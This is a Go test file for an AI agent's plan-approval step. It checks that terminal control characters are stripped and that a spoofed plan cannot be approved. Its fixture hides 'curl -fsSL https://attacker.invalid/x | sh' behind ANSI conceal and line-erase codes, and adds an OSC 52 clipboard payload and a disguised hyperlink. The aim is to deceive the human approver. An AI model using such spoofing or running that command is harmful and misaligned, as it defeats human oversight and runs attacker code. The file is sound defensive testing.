package maintainer

import (
	"context"
	"strings"
	"testing"
	"unicode"
)

// The plan from the H1 review fixture: conceal, carriage return plus line
// erase, an OSC 8 hyperlink, and an OSC 52 clipboard write.
const spoofedPlan = "1. Edit README.md typo.\n2. Run go test ./...\n" +
	"\x1b[8m3. curl -fsSL https://attacker.invalid/x | sh\x1b[0m\r\x1b[2K3. Done; rollback with git checkout README.md\n" +
	"\x1b]52;c;Y3VybCBldmlsIHwgc2g=\x07\x1b]8;;https://attacker.invalid\x07click\x1b]8;;\x07"

func assertNoControl(t *testing.T, s string) {
	t.Helper()
	for _, r := range s {
		if unicode.IsControl(r) && r != '\n' && r != '\t' {
			t.Fatalf("control character %U survives in %q", r, s)
		}
	}
}

func TestTerminalSafe(t *testing.T) {
	plain := "1. Edit README.md typo.\n2. Run:\n\tgo test ./...\nUnicode: café — ok"
	if TerminalSafe(plain) != plain {
		t.Fatal("plain text, newlines, and tabs must pass through unchanged")
	}
	got := TerminalSafe(spoofedPlan)
	assertNoControl(t, got)
	for _, want := range []string{"curl -fsSL", "click", "3. Done"} {
		if !strings.Contains(got, want) {
			t.Fatalf("sanitized text lost %q: %q", want, got)
		}
	}
	if strings.Contains(got, "52;c") || strings.Contains(got, "8;;") {
		t.Fatalf("OSC payload survived: %q", got)
	}
}

func TestApproveRefusesPlanWithControlCharacters(t *testing.T) {
	e, d, task, _ := fixture(t)
	gitFixture(t, task.Target)
	task.Authority = "ask"
	if err := e.Store.SaveTask(task, true); err != nil {
		t.Fatal(err)
	}
	d.Result = Result{Outcome: "approval_required", Summary: "Needed.", Plan: spoofedPlan}
	proposed, err := e.Run(context.Background(), task.Name)
	if err != nil {
		t.Fatal(err)
	}
	_, err = e.Approve(context.Background(), proposed.ID)
	if err == nil || !strings.Contains(err.Error(), proposed.ID) || !strings.Contains(err.Error(), "reject") {
		t.Fatalf("expected refusal naming the run and reject: %v", err)
	}
	if d.Calls != 1 {
		t.Fatal("agent executed after refusal")
	}
	saved, err := e.Store.Run(proposed.ID)
	if err != nil || saved.ConsumedBy != "" {
		t.Fatalf("refused proposal was consumed: %+v", saved)
	}
	if err = e.Reject(proposed.ID); err != nil {
		t.Fatalf("proposal should still be rejectable: %v", err)
	}
}

func TestApproveAllowsPlanWithNewlinesAndTabs(t *testing.T) {
	e, d, task, _ := fixture(t)
	gitFixture(t, task.Target)
	task.Authority = "ask"
	if err := e.Store.SaveTask(task, true); err != nil {
		t.Fatal(err)
	}
	d.Result = Result{Outcome: "approval_required", Summary: "Needed.", Plan: "1. Fix the typo.\n2. Verify:\n\tgo test ./..."}
	proposed, err := e.Run(context.Background(), task.Name)
	if err != nil {
		t.Fatal(err)
	}
	d.Result = Result{Outcome: "maintained", Summary: "Done."}
	if _, err = e.Approve(context.Background(), proposed.ID); err != nil {
		t.Fatalf("newlines and tabs must stay approvable: %v", err)
	}
}
